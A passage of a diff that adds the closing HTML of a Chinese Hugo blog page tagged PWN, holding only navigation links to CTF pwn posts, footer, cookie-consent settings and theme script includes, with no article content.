+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/pwn/" class="post-tag" title="标签 - PWN">PWN</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/buu-pwn-0x30-0x3f/" class="post-nav-item" rel="prev" title="BUU_PWN刷题_0x30-0x3F"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>BUU_PWN刷题_0x30-0x3F</a>
+      <a href="/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/" class="post-nav-item" rel="next" title="Tcache_stashing_unlink_atack调试记录">Tcache_stashing_unlink_atack调试记录<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.123.8"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
